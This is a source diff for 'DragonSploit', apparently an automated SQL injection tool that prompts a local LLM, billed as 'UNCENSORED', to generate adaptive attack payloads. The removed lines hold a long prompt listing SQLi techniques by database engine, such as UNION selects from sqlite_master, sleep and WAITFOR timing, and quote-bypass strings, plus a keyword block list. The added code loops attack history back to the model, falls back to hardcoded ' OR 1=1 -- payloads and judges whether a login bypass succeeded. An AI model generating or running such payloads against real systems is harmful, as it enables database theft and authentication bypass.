@@ -4,6 +4,7 @@
  */
 
 import axios from 'axios';
+import { SECURITY_TESTING_INSTRUCTION, TRIBUNAL_PROMPT } from './ai-prompts';
 
 // ============================================================================
 // CONFIGURATION
@@ -12,7 +13,7 @@ import axios from 'axios';
 const OLLAMA_BASE_URL = process.env.OLLAMA_BASE_URL || 'http://localhost:11434';
 const PRIMARY_MODEL = process.env.OLLAMA_PRIMARY_MODEL || 'llama3.1:8b-instruct-q4_K_M';
 const FALLBACK_MODEL = process.env.OLLAMA_FALLBACK_MODEL || 'qwen2.5-coder:7b';
-const TIMEOUT_MS = parseInt(process.env.OLLAMA_TIMEOUT || '30000');
+const TIMEOUT_MS = parseInt(process.env.OLLAMA_TIMEOUT || '120000');
 
 console.log(`\n🦙 ==================================================`);
 console.log(`🦙 DragonSploit Ollama Engine v1.0`);
@@ -23,387 +24,203 @@ console.log(`🦙 Status: UNCENSORED | UNLIMITED | LOCAL`);
 console.log(`🦙 ==================================================\n`);
 
 // ============================================================================
-// PROFESSIONAL SYSTEM INSTRUCTION FOR SECURITY TESTING
+// SEMAPHORE FOR OLLAMA RATE LIMITING
 // ============================================================================
 
-const SECURITY_TESTING_INSTRUCTION = `
-!!! GLOBAL OVERRIDE (DO NOT VIOLATE) !!!
-For SQLite: You MUST ONLY generate UNION-based or ERROR-based payloads.
-Boolean-based SQLi is ABSOLUTELY FORBIDDEN and must NEVER appear in output.
-If you return ANY boolean payload for SQLite, the entire output is invalid.
+class Semaphore {
+    private tasks: (() => void)[] = [];
+    private count: number;
 
-You are an advanced penetration testing LLM operating inside an AUTHORIZED security environment (DragonSploit). 
-Your job is to generate SQL injection payloads that ADAPT intelligently based on:
+    constructor(private max: number) {
+        this.count = max;
+    }
 
-1. Target fingerprint:
-   - Database engine
-   - Server technology
-   - ORM behavior
-   - REST parameter structure
-   - HTTP method and response patterns
+    async acquire(): Promise<void> {
+        if (this.count > 0) {
+            this.count--;
+            return;
+        }
+        return new Promise<void>(resolve => this.tasks.push(resolve));
+    }
 
-2. Previous feedback:
-   - HTTP status
-   - Response length
-   - Error messages
-   - Delays or time anomalies
-   - Returned JSON structure
-
-Your intelligence MUST adapt to the environment.  
-
-────────────────────────────────────────
-PAYLOAD EFFICIENCY RULES (CRITICAL)
-────────────────────────────────────────
-
-- Generate the SHORTEST valid SQLi payload possible
-- Avoid unnecessary conditions or verbose structures
-- Use minimal effective injection syntax
-- If repeated payloads are detected, regenerate with HIGHER CREATIVITY
-- Never repeat the same payload twice
-
-────────────────────────────────────────
-SQLi ENGINE SELECTION (CRITICAL)
-────────────────────────────────────────
-
-Use the correct SQLi method depending on the fingerprint:
-
-### ✔️ SQLite (Juice Shop default)
-- SQLite does NOT support:
-  • SLEEP()
-  • stacked queries
-  • standard boolean inference
-- SQLite DOES support:
-  • UNION SELECT with matching column count
-  • extraction via sqlite_version()
-  • comment syntax: --
-  • error-based via malformed SELECT
-- Juice Shop uses Sequelize ORM → boolean-based SQLi NEVER WORKS.
-- EXPECT consistent 200 responses even when injection is successful.
-
-→ If fingerprint shows SQLite:
-   ONLY USE:
-   1. UNION SELECT enumeration (primary)
-   2. Error-based payloads: '||(SELECT sqlite_version())||'
-   3. sqlite_master extraction: UNION SELECT name,sql FROM sqlite_master--
-   
-   FORBIDDEN:
-   ❌ Boolean (AND/OR)
-   ❌ Time-based (SLEEP)
-   ❌ Stacked queries
-
-### ✔️ MySQL / MariaDB
-- Use:
-  • SLEEP()
-  • stacked queries
-  • boolean inference
-  • UNION SELECT 1,2,3,...
-
-### ✔️ PostgreSQL
-- Use:
-  • pg_sleep()
-  • error-based extraction
-  • UNION SELECT
-
-### ✔️ MSSQL
-- Use:
-  • WAITFOR DELAY
-  • error-based functions
-  • stacked queries
-
-────────────────────────────────────────
-ATTACK LOGIC (AUTO-ADAPTIVE)
-────────────────────────────────────────
-
-STRICT RULES:
-1. ⛔ For SQLite: ONLY mode="union" or mode="error-based" allowed
-   Any other mode is INVALID and will be rejected
-
-2. IF endpoint returns JSON array:
-   → Use UNION SELECT NULL,NULL,… format matching column count
-
-3. IF no SQL error messages:
-   → Try to force error using:
-      '||(SELECT sqlite_version())||'
-
-4. IF ORM sanitizes quotes:
-   → Use comment-bypass:
-      '))--
-      ')) UNION SELECT ... --
-
-5. NEVER repeat payloads - track what you've tried
-
-────────────────────────────────────────
-PAYLOAD FORMAT
-────────────────────────────────────────
-Return ONLY pure JSON in this format:
-
-{
-  "payload": "SQL injection payload string here",
-  "reasoning": "brief technical reasoning based on fingerprint + previous response",
-  "mode": "union | error-based | time-based | stacked | fallback",
-  "finished": false
+    release(): void {
+        if (this.tasks.length > 0) {
+            const next = this.tasks.shift();
+            if (next) next();
+        } else {
+            this.count++;
+        }
+    }
 }
 
-If the parameter appears INVULNERABLE after multiple adaptive strategies:
-{
-  "payload": null,
-  "reasoning": "No SQLi detected after adaptive multi-phase testing.",
-  "finished": true
-}
-
-────────────────────────────────────────
-STARTUP KNOWLEDGE (VERY IMPORTANT)
-────────────────────────────────────────
-
-This system (DragonSploit) expects MAXIMUM intelligence from you.  
-You MUST:
-
-- Generate shortest possible payloads
-- NEVER repeat payloads
-- Adapt based on fingerprint STRICTLY
-- For SQLite: ONLY union or error-based modes
-- Use sqlite_version(), sqlite_master enumeration as primary extraction
-- Increase creativity if previous attempts failed
-
-────────────────────────────────────────
-END OF INSTRUCTIONS
-────────────────────────────────────────
-`;
+// Global semaphore to prevent OOM on local machine
+const ollamaSemaphore = new Semaphore(1);
 
 // ============================================================================
-// CORE OLLAMA ENGINE
+// CORE FUNCTIONS
 // ============================================================================
 
-interface OllamaResponse {
-    payload: string | null;
-    reasoning: string;
-    mode?: string;
-    finished: boolean;
-}
-
-let currentModel = PRIMARY_MODEL;
-
-/**
- * Check if Ollama is running and accessible
- */
 export async function isOllamaAvailable(): Promise<boolean> {
-    console.log(`[Ollama] Checking availability at: ${OLLAMA_BASE_URL}`); // 🔍 DEBUG LOG
     try {
-        const response = await axios.get(`${OLLAMA_BASE_URL}/api/tags`, {
-            timeout: 10000
-        });
-        return response.status === 200;
-    } catch (error: any) {
-        console.warn(`[Ollama] Service not available at ${OLLAMA_BASE_URL}`);
-        console.error(`[Ollama] Error details: ${error.message}`); // 🔍 DEBUG LOG
-        if (error.code) console.error(`[Ollama] Error code: ${error.code}`);
+        await axios.get(`${OLLAMA_BASE_URL}/api/tags`, { timeout: 2000 });
+        return true;
+    } catch (e) {
         return false;
     }
 }
 
 /**
- * Generate SQL injection payload using Ollama local LLM
+ * Generates the next SQL injection payload using Ollama.
  */
 export async function getNextSqlPayloadOllama(
-    feedback: string,
-    context: {
-        vector?: string;
-        parameter?: string;
-        attemptNumber?: number;
-        fingerprint?: any;
-    } = {}
-): Promise<OllamaResponse> {
+    feedback: string, 
+    context: any = {}
+): Promise<any> {
+    await ollamaSemaphore.acquire();
+    
+    // Construct Prompt
+    const historyText = (context.history || [])
+        .map((h: any, i: number) => `Attempt #${i+1} [${h.payload}]: ${h.status} - ${h.response?.substring(0, 100)}...`)
+        .join('\n');
 
-    const logFeedback = feedback.length > 120 ? feedback.substring(0, 120) + '...' : feedback;
-    console.log(`[Ollama] 🦙 Processing: "${logFeedback}"`);
+    const prompt = `
+${SECURITY_TESTING_INSTRUCTION}
 
-    const prompt = buildPrompt(feedback, context);
+TARGET CONTEXT:
+URL: ${context.url || 'Unknown'}
+Fingerprint: ${context.fingerprint ? JSON.stringify(context.fingerprint) : 'Unknown'}
 
-    try {
-        const response = await callOllama(prompt, currentModel);
-        return response;
+ATTACK HISTORY:
+${historyText}
 
-    } catch (error: any) {
-
-        // If primary model fails, try fallback
-        if (currentModel === PRIMARY_MODEL) {
-            console.warn(`[Ollama] Primary model failed, trying fallback...`);
-            console.error(`[Ollama] Primary model error: ${error.message}`); // 🔍 DEBUG LOG
-            if (error.response) {
-                console.error(`[Ollama] Response status: ${error.response.status}`);
-                console.error(`[Ollama] Response data: ${JSON.stringify(error.response.data)}`);
-            }
-            try {
-                const fallbackResponse = await callOllama(prompt, FALLBACK_MODEL);
-                currentModel = FALLBACK_MODEL; // Switch to fallback
-                return fallbackResponse;
-            } catch (fallbackError) {
-                console.error('[Ollama] Both models failed:', fallbackError);
-                throw new Error('Ollama service unavailable');
-            }
-        }
-
-        throw error;
-    }
-}
-
-/**
- * Build optimized prompt for payload generation
- */
-function buildPrompt(feedback: string, context: any): string {
-    const vectorInfo = context.vector ? `\n[Current Attack Vector: ${context.vector}]` : '';
-    const paramInfo = context.parameter ? `\n[Target Parameter: ${context.parameter}]` : '';
-    const attemptInfo = context.attemptNumber ? `\n[Attempt #${context.attemptNumber}]` : '';
-
-    const fingerprint = context.fingerprint
-        ? `
-[FINGERPRINT]
-Server: ${context.fingerprint.server || 'Unknown'}
-Language: ${context.fingerprint.language || 'Unknown'}
-Database: ${context.fingerprint.database || 'Unknown'}
-`
-        : '\n[FINGERPRINT]\nUnknown\n';
-
-    return `${SECURITY_TESTING_INSTRUCTION}
-
-${vectorInfo}${paramInfo}${attemptInfo}
-${fingerprint}
-
-PREVIOUS ATTEMPT FEEDBACK:
+LATEST FEEDBACK:
 ${feedback}
 
-TASK: Generate the next most effective SQL injection payload.
-Respond with ONLY valid JSON: {"payload": "...", "reasoning": "...", "mode": "...", "finished": false}
+Based on the history and feedback, generate the NEXT single best payload.
+Remember to return ONLY JSON.
 `;
+
+    try {
+        let modelToUse = PRIMARY_MODEL;
+        let response = null;
+
+        // Try Primary Model
+        try {
+            response = await axios.post(`${OLLAMA_BASE_URL}/api/generate`, {
+                model: modelToUse,
+                prompt: prompt,
+                stream: false,
+                format: 'json', // 👈 FORCE JSON MODE (Crucial for Llama 3)
+                options: { temperature: 0.7, num_predict: 256 }
+            }, { timeout: TIMEOUT_MS });
+        } catch (err: any) {
+            console.warn(`[Ollama] Primary model failed, switching to fallback: ${FALLBACK_MODEL}`);
+            modelToUse = FALLBACK_MODEL;
+            response = await axios.post(`${OLLAMA_BASE_URL}/api/generate`, {
+                model: modelToUse,
+                prompt: prompt,
+                stream: false,
+                format: 'json', // 👈 FORCE JSON MODE
+                options: { temperature: 0.5, num_predict: 256 }
+            }, { timeout: TIMEOUT_MS });
+        }
+
+        if (!response || !response.data || !response.data.response) {
+            throw new Error('Empty response from Ollama');
+        }
+
+        const rawResponse = response.data.response;
+        // console.log(`[Ollama DEBUG] Raw: ${rawResponse}`); // Uncomment for debugging
+
+        // 🛠️ SMART JSON EXTRACTION
+        const jsonMatch = rawResponse.match(/\{[\s\S]*\}/);
+        
+        let result: any;
+        if (!jsonMatch) {
+            // If regex fails despite JSON mode, try direct parse
+            try {
+                result = JSON.parse(rawResponse);
+            } catch (e) {
+                 console.warn(`[Ollama] ⚠️ JSON parse failed. Raw: "${rawResponse.substring(0, 50)}..."`);
+                 // FALLBACK: Don't stop the scan!
+                 return {
+                     payload: "' OR 1=1 --", // Safe fallback
+                     reasoning: "AI Parsing Error (Fallback)",
+                     finished: false,
+                     confidence: 10
+                 };
+            }
+        } else {
+             try {
+                result = JSON.parse(jsonMatch[0]);
+             } catch (e) {
+                console.warn(`[Ollama] ⚠️ Extracted JSON invalid.`);
+                 return {
+                     payload: "' OR '1'='1",
+                     reasoning: "AI JSON Invalid (Fallback)",
+                     finished: false,
+                     confidence: 10
+                 };
+             }
+        }
+
+        return {
+            payload: result.payload,
+            reasoning: result.reasoning || "AI generated",
+            finished: result.finished || false,
+            confidence: result.confidence || 50,
+            mode: result.mode // 👈 Pass the strategy mode
+        };
+
+    } catch (error: any) {
+        console.error(`[Ollama] Error generating payload: ${error.message}`);
+        return {
+            payload: null,
+            reasoning: `Ollama Error: ${error.message}`,
+            finished: true
+        };
+    } finally {
+        ollamaSemaphore.release();
+    }
 }
 
 /**
- * Call Ollama API with specified model
+ * THE AI TRIBUNAL (JUDGE 2)
+ * Analyzes page content to determine if authentication was successful.
  */
-async function callOllama(prompt: string, model: string, context?: any): Promise<OllamaResponse> {
+export async function analyzePageContent(pageText: string): Promise<{
+    authenticated: boolean;
+    confidence: number;
+    reason: string;
+}> {
+    await ollamaSemaphore.acquire();
 
-    const startTime = Date.now();
+    try {
+        // Inject page text into the template
+        const prompt = TRIBUNAL_PROMPT.replace('{{PAGE_TEXT}}', pageText.substring(0, 4000));
 
-    const response = await axios.post(
-        `${OLLAMA_BASE_URL}/api/generate`,
-        {
-            model: model,
+        const response = await axios.post(`${OLLAMA_BASE_URL}/api/generate`, {
+            model: PRIMARY_MODEL,
             prompt: prompt,
             stream: false,
-            options: {
-                temperature: 0.3,
-                top_p: 0.9,
-                top_k: 40,
-                num_predict: 300, // Limit response length for speed
-            },
-            format: 'json' // Request JSON response format
-        },
-        {
-            timeout: TIMEOUT_MS,
-            headers: { 'Content-Type': 'application/json' }
-        }
-    );
+            options: { temperature: 0.1, num_predict: 128 } // Low temp for deterministic logic
+        }, { timeout: TIMEOUT_MS });
 
-    const elapsed = Date.now() - startTime;
-
-    if (!response.data || !response.data.response) {
-        throw new Error('Empty response from Ollama');
-    }
-
-    const responseText = response.data.response;
-
-    // Parse JSON from response
-    let parsed: any;
-    try {
-        // Try direct parse
-        parsed = JSON.parse(responseText);
-    } catch (e) {
-        // Try to extract JSON from markdown code blocks or text
-        const jsonMatch = responseText.match(/\{[\s\S]*\}/);
-        if (jsonMatch) {
-            parsed = JSON.parse(jsonMatch[0]);
-        } else {
-            throw new Error('Could not parse JSON from Ollama response');
-        }
-    }
-
-    // Validate required fields
-    if (!parsed.payload) {
-        throw new Error('Ollama response missing payload field');
-    }
-
-    // HARD SQLITE BLOCKER (Boolean + Stacked Queries)
-    if (context?.fingerprint?.database?.toLowerCase() === "sqlite") {
-        const p = (parsed.payload || "").toLowerCase();
-
-        const forbiddenPatterns = [
-            "1=1",
-            "1=2",
-            " and ",
-            " or ",
-            ";",          // blocks stacked queries
-            "select ",    // prevents stacked select
-            " sleep",
-            " pg_sleep",
-            " waitfor",
-            "-- -",       // block malformed boolean tricks
-        ];
-
-        const forbidden = forbiddenPatterns.some(pattern => p.includes(pattern));
-
-        if (forbidden) {
-            console.warn("[SQLite-Blocker] Forbidden boolean/stacked SQLi payload detected. Auto-correcting...");
-
-            return {
-                payload: "' UNION SELECT NULL,NULL FROM sqlite_master --",
-                reasoning: "Boolean & stacked SQLi blocked for SQLite. Switching to UNION-based SQLi.",
-                mode: "union",
-                finished: false
-            };
-        }
-    }
-
-    console.log(`[Ollama] ✅ Generated in ${(elapsed / 1000).toFixed(1)}s`);
-
-    return {
-        payload: parsed.payload,
-        reasoning: parsed.reasoning || 'Generated via Ollama',
-        mode: parsed.mode,
-        finished: parsed.finished || false
-    };
-}
-
-/**
- * Health check for monitoring
- */
-export async function ollamaHealthCheck(): Promise<{
-    status: 'healthy' | 'degraded' | 'down';
-    models: string[];
-    responseTime: number;
-}> {
-    const startTime = Date.now();
-
-    try {
-        const response = await axios.get(`${OLLAMA_BASE_URL}/api/tags`, {
-            timeout: 5000
-        });
-
-        const models = response.data.models?.map((m: any) => m.name) || [];
-        const responseTime = Date.now() - startTime;
-
-        const hasRequiredModels = models.includes(PRIMARY_MODEL) || models.includes(FALLBACK_MODEL);
-
+        let jsonStr = response.data.response.trim();
+        jsonStr = jsonStr.replace(/```json/g, '').replace(/```/g, '').trim();
+        
+        const result = JSON.parse(jsonStr);
+        
         return {
-            status: hasRequiredModels ? 'healthy' : 'degraded',
-            models: models,
-            responseTime: responseTime
+            authenticated: result.authenticated === true,
+            confidence: typeof result.confidence === 'number' ? result.confidence : 50,
+            reason: result.reason || "AI Judgment"
         };
-
-    } catch (error) {
-        return {
-            status: 'down',
-            models: [],
-            responseTime: Date.now() - startTime
-        };
+        
+    } catch (error: any) {
+        console.error(`[AI Tribunal] ❌ Judge 2 Failed: ${error.message}`);
+        return { authenticated: false, confidence: 0, reason: `AI Error: ${error.message}` };
+    } finally {
+        ollamaSemaphore.release();
     }
 }
